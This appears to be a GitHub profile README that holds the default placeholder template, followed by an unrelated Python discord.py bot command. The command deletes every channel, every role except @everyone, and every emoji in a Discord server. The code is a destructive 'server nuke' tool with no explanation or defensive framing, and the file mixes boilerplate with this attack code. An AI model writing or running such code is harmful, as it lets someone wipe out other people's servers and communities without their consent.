- 👋 Hi, I’m @tubeddd
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
tubeddd/tubeddd is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
@bot.command()
async def all(ctx):
    #DaCap#9999
    print('Deleting all...')

    print('Deleting channels..')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        except discord.HTTPException:
            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{channel.name} has been deleted in {ctx.guild.name}")

    print('Deleting roles..')
    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")

    print('Deleting emojis..')
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
        except discord.Forbidden:
            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{emoji.name} has been deleted in {ctx.guild.name}")

    print("Action Completed: dall all")
